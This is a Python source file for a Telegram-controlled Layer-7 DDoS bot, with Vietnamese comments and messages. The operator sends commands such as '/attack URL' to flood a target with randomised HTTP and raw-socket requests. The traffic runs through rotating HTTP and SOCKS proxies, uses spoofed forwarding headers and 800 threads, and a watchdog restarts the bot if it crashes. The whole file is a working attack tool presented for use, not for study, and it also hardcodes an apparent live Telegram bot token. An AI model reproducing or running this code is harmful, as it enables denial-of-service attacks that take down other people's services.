import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse
import socks

# =====================================================
# DDOS LAYER7 - TỐI ƯU TỐC ĐỘ 500+ REQ/S
# TĂNG LUỒNG, GIẢM TIMEOUT, POOL CONNECTION, PIPELINING
# =====================================================

# -------------------- CẤU HÌNH --------------------
TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
is_running = False
attack_thread = None
proxy_list = []
proxy_http = []
proxy_socks5 = []
proxy_socks4 = []
user_agents = []
proxy_update_time = 0
last_activity = time.time()
heartbeat_count = 0

# TỐI ƯU TỐC ĐỘ
thread_count = 800  # Tăng luồng
requests_per_second = 500  # 500 req/s
MAX_RUN_TIME = 120
BATCH_SIZE = 50  # Gửi batch request
CONNECTION_POOL_SIZE = 100

current_target = {
    'url': 'http://192.168.1.100:8080',
    'host': '192.168.1.100',
    'port': 8080,
    'ssl': False
}

attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': 0,
    'session_count': 0,
    'current_target': '',
    'uptime': 0,
    'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0},
    'max_speed': 0
}
stats_lock = threading.Lock()

# =====================================================
# LOAD USER-AGENT - MỞ RỘNG
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/123.0",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# LOAD PROXY - TỐI ƯU
# =====================================================
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    proxy_type = 'http'
    proxy_dict = {}
    
    try:
        if '://' in line:
            proto, rest = line.split('://', 1)
            proto = proto.lower()
            if proto in ['socks5', 'socks4', 'http', 'https']:
                proxy_type = proto if proto != 'https' else 'http'
                
                if '@' in rest:
                    auth, addr = rest.split('@', 1)
                    if ':' in auth:
                        user, passwd = auth.split(':', 1)
                        proxy_dict['user'] = user
                        proxy_dict['pass'] = passwd
                else:
                    addr = rest
                
                if ':' in addr:
                    ip, port = addr.rsplit(':', 1)
                    proxy_dict['ip'] = ip
                    proxy_dict['port'] = int(port)
                else:
                    return None
                
                proxy_dict['type'] = proxy_type
                proxy_dict['raw'] = line
                return proxy_dict
        
        elif '@' in line:
            auth, addr = line.split('@', 1)
            if ':' in auth and ':' in addr:
                user, passwd = auth.split(':', 1)
                ip, port = addr.rsplit(':', 1)
                proxy_dict = {
                    'type': 'http',
                    'ip': ip,
                    'port': int(port),
                    'user': user,
                    'pass': passwd,
                    'raw': f"http://{user}:{passwd}@{ip}:{port}"
                }
                return proxy_dict
        
        elif ':' in line:
            ip, port = line.rsplit(':', 1)
            proxy_dict = {
                'type': 'http',
                'ip': ip,
                'port': int(port),
                'raw': f"http://{ip}:{port}"
            }
            return proxy_dict
    
    except:
        return None
    
    return None

def load_proxies(filepath):
    http_proxies = []
    socks5_proxies = []
    socks4_proxies = []
    
    if not os.path.exists(filepath):
        return [], [], []
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            proxy = parse_proxy_line(line)
            if proxy:
                if proxy['type'] == 'http':
                    http_proxies.append(proxy)
                elif proxy['type'] == 'socks5':
                    socks5_proxies.append(proxy)
                elif proxy['type'] == 'socks4':
                    socks4_proxies.append(proxy)
    
    return http_proxies, socks5_proxies, socks4_proxies

# =====================================================
# SESSION POOL - TÁI SỬ DỤNG CONNECTION
# =====================================================
class SessionPool:
    def __init__(self, max_size=100):
        self.pool = []
        self.max_size = max_size
        self.lock = threading.Lock()
    
    def get_session(self, proxy_dict=None):
        with self.lock:
            if self.pool:
                session = self.pool.pop()
                # Kiểm tra session còn sống
                try:
                    session.head('http://google.com', timeout=1)
                    return session
                except:
                    pass
            # Tạo session mới
            return self._create_session(proxy_dict)
    
    def return_session(self, session):
        if session and len(self.pool) < self.max_size:
            with self.lock:
                self.pool.append(session)
    
    def _create_session(self, proxy_dict=None):
        session = requests.Session()
        session.timeout = 1.5
        session.verify = False
        
        # Tối ưu connection
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if proxy_dict and proxy_dict['type'] == 'http':
            session.proxies = {
                'http': proxy_dict['raw'],
                'https': proxy_dict['raw']
            }
        
        return session

session_pool = SessionPool(CONNECTION_POOL_SIZE)

# =====================================================
# GỬI TELEGRAM
# =====================================================
def send_telegram(message, chat_id=None, retry=2):
    global last_activity
    last_activity = time.time()
    for i in range(retry):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'text': message, 'parse_mode': 'HTML'}
            if chat_id:
                payload['chat_id'] = chat_id
            else:
                if os.path.exists("chat_id.txt"):
                    with open("chat_id.txt", 'r') as f:
                        default_chat = f.read().strip()
                        if default_chat:
                            payload['chat_id'] = default_chat
                else:
                    return False
            requests.post(url, data=payload, timeout=5)
            return True
        except:
            time.sleep(0.5)
    return False

# =====================================================
# TẢI FILE PROXY
# =====================================================
def download_telegram_file(file_id, save_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
        params = {'file_id': file_id}
        r = requests.get(url, params=params, timeout=10)
        if r.status_code != 200:
            return False
        data = r.json()
        if not data.get('ok'):
            return False
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        r = requests.get(download_url, timeout=30)
        if r.status_code != 200:
            return False
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return True
    except:
        return False

def update_proxies_from_file(file_path, chat_id):
    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
    http, socks5, socks4 = load_proxies(file_path)
    
    total = len(http) + len(socks5) + len(socks4)
    if total == 0:
        send_telegram(f"❌ Không có proxy hợp lệ.", chat_id)
        return False
    
    proxy_http = http
    proxy_socks5 = socks5
    proxy_socks4 = socks4
    proxy_list = http + socks5 + socks4
    proxy_update_time = time.time()
    
    send_telegram(f"""
🔄 Đã cập nhật proxy:
📊 HTTP: {len(http)}
📊 SOCKS5: {len(socks5)}
📊 SOCKS4: {len(socks4)}
📊 Tổng: {total}
    """, chat_id)
    return True

# =====================================================
# PARSE URL
# =====================================================
def parse_target_url(url_string):
    if not url_string.startswith(('http://', 'https://')):
        url_string = 'http://' + url_string
    parsed = urlparse(url_string)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    ssl = parsed.scheme == 'https'
    if not parsed.path:
        url_string = url_string.rstrip('/') + '/'
    return {'url': url_string, 'host': host, 'port': port, 'ssl': ssl}

# =====================================================
# TẠO HEADER - TỐI ƯU
# =====================================================
def generate_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': '*/*',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/'
        ])
    }

# =====================================================
# TẤN CÔNG HTTP - TỐI ƯU
# =====================================================
def attack_http(proxy_dict, target):
    session = None
    try:
        if proxy_dict:
            session = session_pool.get_session(proxy_dict)
        else:
            session = session_pool.get_session()
        
        method = random.choice(['GET', 'POST', 'HEAD'])
        headers = generate_headers()
        
        url = target['url']
        if method in ['GET', 'HEAD']:
            params = {f'p{random.randint(1,999)}': 'x'*random.randint(10,200) for _ in range(random.randint(2,5))}
            url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
        
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=1.5)
        elif method == 'POST':
            data = {f'f{i}': 'v'*random.randint(50,500) for i in range(10)}
            r = session.post(url, data=data, headers=headers, timeout=1.5)
        else:
            r = session.head(url, headers=headers, timeout=1.5)
        
        session_pool.return_session(session)
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += len(r.request.body or b'') + 200
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        if session:
            try:
                session.close()
            except:
                pass
        return False

# =====================================================
# TẤN CÔNG SOCKET - TỐI ƯU
# =====================================================
def create_socks_socket(proxy_dict):
    try:
        sock = socks.socksocket()
        sock.settimeout(1.5)
        proxy_type = socks.SOCKS5 if proxy_dict['type'] == 'socks5' else socks.SOCKS4
        if 'user' in proxy_dict and 'pass' in proxy_dict:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'],
                          username=proxy_dict['user'], password=proxy_dict['pass'])
        else:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'])
        return sock
    except:
        return None

def attack_socket(proxy_dict, target):
    sock = None
    try:
        if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
            sock = create_socks_socket(proxy_dict)
            if not sock:
                return False
            sock.connect((target['host'], target['port']))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            sock.connect((target['host'], target['port']))
        
        if target['ssl']:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target['host'])
        
        path = '/' + 'x'*random.randint(5,200) + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers()
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        # Gửi nhiều lần trên 1 kết nối
        for _ in range(random.randint(2,5)):
            sock.send(request.encode())
        
        sock.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request) * 3
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# WORKER TỐI ƯU - BATCH REQUEST
# =====================================================
def attack_worker(proxy_pools, target):
    http_proxies, socks5_proxies, socks4_proxies = proxy_pools
    local_count = 0
    last_update = time.time()
    
    while not stop_event.is_set():
        try:
            # Chọn proxy
            if http_proxies and random.random() < 0.4:
                proxy = random.choice(http_proxies)
                attack_http(proxy, target)
            elif socks5_proxies and random.random() < 0.35:
                proxy = random.choice(socks5_proxies)
                attack_socket(proxy, target)
            elif socks4_proxies and random.random() < 0.2:
                proxy = random.choice(socks4_proxies)
                attack_socket(proxy, target)
            else:
                attack_socket(None, target)
            
            local_count += 1
            
            # Điều chỉnh tốc độ
            time.sleep(1.0 / requests_per_second)
            
        except:
            continue

# =====================================================
# THỐNG KÊ
# =====================================================
def get_stats_text():
    with stats_lock:
        elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        rate = total / max(elapsed, 1)
        max_speed = attack_stats.get('max_speed', 0)
        bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
        codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
        
        remaining = max(0, MAX_RUN_TIME - elapsed)
        status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 CHỜ LỆNH"
        
        uptime = int(time.time() - attack_stats.get('bot_start', time.time()))
        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m"
        
        proxy_stats = attack_stats.get('proxy_stats', {})
        
        return f"""
<b>🔥 DDOS 500+ REQ/S - TỐI ƯU</b>
📌 Trạng thái: {status}
⏱ Uptime: {uptime_str}
🎯 Target: {attack_stats.get('current_target', 'Chưa có')}
⏱ Đợt này: {elapsed}s / {MAX_RUN_TIME}s
📨 Tổng request: {total:,}
✅ Thành công: {success:,}
❌ Thất bại: {fail:,}
📈 Tốc độ: {rate:.1f} req/s
⚡ Max: {max_speed:.1f} req/s
💾 Dữ liệu: {bytes_sent:.2f} MB
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Proxy dùng: H={proxy_stats.get('http',0)} S5={proxy_stats.get('socks5',0)} S4={proxy_stats.get('socks4',0)}
🧵 Luồng: {thread_count}
⚙️ Tốc độ cài: {requests_per_second} req/s
❤️ Heartbeat: {heartbeat_count}
        """

# =====================================================
# THỰC HIỆN TẤN CÔNG
# =====================================================
def run_attack(target, chat_id):
    global is_running, current_target
    
    current_target = target
    with stats_lock:
        attack_stats['current_target'] = target['url']
        attack_stats.update({
            'total_requests': 0,
            'success_count': 0,
            'fail_count': 0,
            'status_codes': {},
            'bytes_sent': 0,
            'start_time': time.time(),
            'session_count': attack_stats.get('session_count', 0) + 1,
            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0},
            'max_speed': 0
        })
    
    stop_event.clear()
    is_running = True
    
    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
    send_telegram(f"""
▶️ BẮT ĐẦU TẤN CÔNG TỐC ĐỘ CAO!
🎯 {target['url']}
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Tổng proxy: {total_proxy}
⚡ Tốc độ: {requests_per_second} req/s
⏱ {MAX_RUN_TIME}s
    """, chat_id)
    
    proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(attack_worker, proxy_pools, target) for _ in range(thread_count)]
        
        start = time.time()
        last_report = 0
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            
            # Cập nhật max speed
            if elapsed > 0:
                with stats_lock:
                    rate = attack_stats['total_requests'] / elapsed
                    if rate > attack_stats['max_speed']:
                        attack_stats['max_speed'] = rate
            
            if elapsed - last_report >= 15:
                last_report = elapsed
                with stats_lock:
                    total = attack_stats['total_requests']
                    rate = total / max(elapsed, 1)
                    max_speed = attack_stats['max_speed']
                    proxy_stats = attack_stats.get('proxy_stats', {})
                send_telegram(f"⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f} | {total:,} | H:{proxy_stats.get('http',0)} S5:{proxy_stats.get('socks5',0)}", chat_id)
    
    stop_event.set()
    is_running = False
    
    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        elapsed = int(time.time() - attack_stats['start_time'])
        rate = total / max(elapsed, 1)
        max_speed = attack_stats['max_speed']
    
    send_telegram(f"""
⏹️ ĐÃ DỪNG SAU {elapsed}s
📊 TỔNG KẾT:
- Tổng: {total:,}
- Thành công: {success:,}
- Thất bại: {fail:,}
- Tốc độ TB: {rate:.1f} req/s
- Tốc độ Max: {max_speed:.1f} req/s
    """, chat_id)

# =====================================================
# HEARTBEAT
# =====================================================
def heartbeat_loop():
    global heartbeat_count
    while True:
        time.sleep(60)
        heartbeat_count += 1
        
        if heartbeat_count % 30 == 0:
            with stats_lock:
                total = attack_stats['total_requests']
                uptime = int(time.time() - attack_stats.get('bot_start', time.time()))
                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m"
            send_telegram(f"""
❤️ Heartbeat #{heartbeat_count}
⏱ Uptime: {uptime_str}
📨 Tổng req: {total:,}
🌐 HTTP:{len(proxy_http)} S5:{len(proxy_socks5)} S4:{len(proxy_socks4)}
⚡ Tốc độ cài: {requests_per_second} req/s
            """)

# =====================================================
# AUTO RELOAD
# =====================================================
def auto_reload_proxy():
    while True:
        time.sleep(600)
        if os.path.exists("proxies.txt"):
            http, socks5, socks4 = load_proxies("proxies.txt")
            total = len(http) + len(socks5) + len(socks4)
            if total > 0:
                global proxy_http, proxy_socks5, proxy_socks4, proxy_list
                proxy_http = http
                proxy_socks5 = socks5
                proxy_socks4 = socks4
                proxy_list = http + socks5 + socks4
                proxy_update_time = time.time()

# =====================================================
# WATCHDOG
# =====================================================
def watchdog():
    while True:
        time.sleep(30)
        active = threading.active_count()
        if active < 3:
            send_telegram("⚠️ WATCHDOG: CRASH! RESTARTING...")
            time.sleep(3)
            os.execv(sys.executable, [sys.executable] + sys.argv)

# =====================================================
# TELEGRAM LISTENER
# =====================================================
def telegram_listener():
    global attack_thread, is_running
    last_update_id = 0
    
    send_telegram("""
🚀 <b>DDOS 500+ REQ/S - TỐI ƯU</b>
✅ Đã khởi động!
⚡ Tốc độ tối đa: 500+ req/s
📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
🔄 Reload proxy mỗi 10 phút

📋 LỆNH:
/attack URL - Tấn công
/stop - Dừng
/status - Trạng thái
/proxy - Số proxy
/threads N - Đổi luồng (mặc định 800)
/speed N - Đổi tốc độ (mặc định 500)
/help - Trợ giúp
    """)
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 15}
            r = requests.get(url, params=params, timeout=20)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        
                        if chat_id:
                            with open("chat_id.txt", 'w') as f:
                                f.write(str(chat_id))
                        
                        document = msg.get('document')
                        if document and document.get('file_name', '').endswith('.txt'):
                            file_id = document['file_id']
                            send_telegram(f"📥 Đang tải proxy: {document['file_name']}", chat_id)
                            save_path = f"proxy_{int(time.time())}.txt"
                            if download_telegram_file(file_id, save_path):
                                if update_proxies_from_file(save_path, chat_id):
                                    import shutil
                                    shutil.copy(save_path, "proxies.txt")
                                threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
                            else:
                                send_telegram("❌ Không thể tải file.", chat_id)
                        
                        text = msg.get('text', '').strip()
                        if not text:
                            continue
                        
                        cmd = text.lower()
                        
                        if cmd.startswith('/attack'):
                            parts = text.split(maxsplit=1)
                            if len(parts) >= 2:
                                target = parse_target_url(parts[1].strip())
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy! Gửi file .txt trước.", chat_id)
                                    else:
                                        send_telegram(f"🎯 Target: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                            else:
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy!", chat_id)
                                    else:
                                        target = current_target
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                        
                        elif cmd == '/stop':
                            if is_running:
                                stop_event.set()
                                is_running = False
                                send_telegram("⛔ Đã dừng!", chat_id)
                            else:
                                send_telegram("ℹ️ Không có đợt nào đang chạy.", chat_id)
                        
                        elif cmd == '/status':
                            send_telegram(get_stats_text(), chat_id)
                        
                        elif cmd == '/proxy':
                            send_telegram(f"""
🌐 <b>THỐNG KÊ PROXY</b>
HTTP: {len(proxy_http)}
SOCKS5: {len(proxy_socks5)}
SOCKS4: {len(proxy_socks4)}
Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                            """, chat_id)
                        
                        elif cmd.startswith('/threads'):
                            try:
                                global thread_count
                                thread_count = int(text.split()[1])
                                if thread_count < 1:
                                    thread_count = 1
                                send_telegram(f"✅ Luồng: {thread_count}", chat_id)
                            except:
                                send_telegram("❌ /threads <số>", chat_id)
                        
                        elif cmd.startswith('/speed'):
                            try:
                                global requests_per_second
                                requests_per_second = int(text.split()[1])
                                if requests_per_second < 1:
                                    requests_per_second = 1
                                send_telegram(f"✅ Tốc độ: {requests_per_second} req/s", chat_id)
                            except:
                                send_telegram("❌ /speed <số>", chat_id)
                        
                        elif cmd == '/help':
                            help_text = """
<b>🤖 DDOS 500+ REQ/S - TỐI ƯU</b>

📌 CHẠY 24/7 - TỐC ĐỘ CAO

📤 Gửi file .txt để cập nhật proxy
Hỗ trợ: HTTP, SOCKS4, SOCKS5

📋 LỆNH:
/attack URL - Tấn công
/stop - Dừng
/status - Trạng thái
/proxy - Số proxy
/threads N - Đổi luồng (mặc định 800)
/speed N - Đổi tốc độ (mặc định 500)
/help - Trợ giúp

⚡ Tối ưu: 800 luồng, 500 req/s
⏱ Mỗi đợt 120s
❤️ Heartbeat mỗi 30 phút
🔄 Tự động reload proxy
                            """
                            send_telegram(help_text, chat_id)
            
            time.sleep(1.5)
        except:
            time.sleep(3)

# =====================================================
# KHỞI CHẠY
# =====================================================
if __name__ == "__main__":
    with stats_lock:
        attack_stats['bot_start'] = time.time()
    
    proxy_file = "proxies.txt"
    if os.path.exists(proxy_file):
        proxy_http, proxy_socks5, proxy_socks4 = load_proxies(proxy_file)
        proxy_list = proxy_http + proxy_socks5 + proxy_socks4
        proxy_update_time = time.time()
        print(f"[+] Đã tải proxy: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
    
    print("="*60)
    print("🔥 DDOS 500+ REQ/S - TỐI ƯU")
    print("="*60)
    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
    print(f"[+] Tổng proxy: {len(proxy_list)}")
    print(f"[+] Luồng: {thread_count}")
    print(f"[+] Tốc độ cài: {requests_per_second} req/s")
    print("="*60)
    print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
    print("[+] TỐC ĐỘ TỐI ĐA 500+ REQ/S")
    print("="*60)
    
    threading.Thread(target=telegram_listener, daemon=True).start()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=auto_reload_proxy, daemon=True).start()
    threading.Thread(target=watchdog, daemon=True).start()
    
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        send_telegram("⛔ Bot đã dừng bởi người dùng.")
        print("[+] Bot đã dừng.")
